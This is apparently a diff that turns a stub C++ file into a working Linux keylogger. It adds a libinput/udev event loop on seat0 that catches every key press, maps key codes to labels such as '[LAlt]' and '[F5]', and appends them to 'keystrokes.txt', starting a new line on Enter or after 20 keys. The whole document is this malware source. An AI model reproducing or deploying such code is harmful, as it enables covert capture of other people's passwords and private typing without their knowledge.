@@ -1,26 +1,21 @@
 #include <unistd.h>
 #include <map> 
 #include <libinput.h>
+#include <fstream>   // for ofstream
+#include <string>    // for std::string
+#include <iostream>
+#include <libudev.h>
+#include <fcntl.h>
 
 namespace params {
 
-  int counter = 0; 
+  const std::string filename = "keystrokes.txt";
 
-  std::string filename = "keylogs.txt";
+  const int max_keystrokes = 20;
 
+  const int newline_limit = 20;
 
-
-}
-
-
-static void 
-
-
-int main() {
- 
-
-
-}
+  int counter = 0;
 
 
 const std::map<int, std::string> key_map = {
@@ -50,6 +45,7 @@ const std::map<int, std::string> key_map = {
     {56, "[LAlt]"},   {100, "[RAlt]"},
 
     // navigation
+
     {103, "[Up]"}, {108, "[Down]"}, {105, "[Left]"}, {106, "[Right]"},
     {102, "[Home]"}, {107, "[End]"}, {104, "[PageUp]"}, {109, "[PageDown]"},
     {110, "[Insert]"}, {111, "[Delete]"},
@@ -59,3 +55,73 @@ const std::map<int, std::string> key_map = {
     {63, "[F5]"},  {64, "[F6]"},  {65, "[F7]"},  {66, "[F8]"},
     {67, "[F9]"},  {68, "[F10]"}, {87, "[F11]"}, {88, "[F12]"},
 };
+
+
+
+}
+
+
+static void write_to_file(std::string str, std::string filename) {
+
+  
+  std::ofstream file;
+
+  file.open(filename, std::ios_base::app);
+
+  
+  file << str;
+
+  ++params::counter;
+
+  if ( str == "[ENTER]" ) {
+
+      file << std::endl;
+
+  }
+  else if (params::counter == params::newline_limit){
+      file << std::endl;
+      params::counter = 0;
+  }
+  file.close();
+
+}
+
+static int open_restricted(const char *path, int flags, void *user_data) {
+    return open(path, flags);
+}
+static void close_restricted(int fd, void *user_data) {
+    close(fd);
+}
+static const libinput_interface interface = {
+    open_restricted,
+    close_restricted,
+};
+
+
+int main() {
+
+  struct udev *udev = udev_new();
+  struct libinput *li = libinput_udev_create_context(&interface, nullptr, udev);
+  libinput_udev_assign_seat(li, "seat0");
+
+  while (true) {
+      libinput_dispatch(li);
+      struct libinput_event *ev;
+      while ((ev = libinput_get_event(li))) {                                                 // whole thing pasted from documentation not even gonna lie ( except the write part)
+          if (libinput_event_get_type(ev) == LIBINPUT_EVENT_KEYBOARD_KEY) {
+              auto *kb = libinput_event_get_keyboard_event(ev);
+              uint32_t key   = libinput_event_keyboard_get_key(kb);
+              bool pressed   = libinput_event_keyboard_get_key_state(kb)
+                                == LIBINPUT_KEY_STATE_PRESSED;
+              if (pressed && params::key_map.count(key)) {
+                  write_to_file(params::key_map.at(key), params::filename);
+              }
+          }
+          libinput_event_destroy(ev);
+      }
+  }
+ 
+
+
+}
+
